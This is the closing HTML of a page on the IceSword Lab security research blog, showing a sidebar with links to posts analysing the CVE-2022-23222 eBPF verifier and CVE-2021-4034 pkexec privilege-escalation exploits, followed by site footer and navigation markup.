            <a href="../../../../2022/07/04/CVE-2022-23222/">CVE-2022-23222  eBPF verifier 提权漏洞利用分析</a>
          </li>
        
          <li>
            <a href="../../../../2022/02/10/CVE-2021-4034/">CVE-2021-4034 pkexec 本地提权漏洞利用解析</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2025 IceSword Lab<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
  
    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
  
    <a href="../../../../research" class="mobile-nav-link">Research</a>
  
    <a href="../../../../vulnerabilities" class="mobile-nav-link">Vulnerabilities</a>
  
    <a href="../../../../recruitment" class="mobile-nav-link">Recruitment</a>
  
    <a href="../../../../about" class="mobile-nav-link">About</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="../../../../fancybox/jquery.fancybox.css">

  
<script src="../../../../fancybox/jquery.fancybox.pack.js"></script>




<script src="../../../../js/script.js"></script>




  </div>
</body>
</html>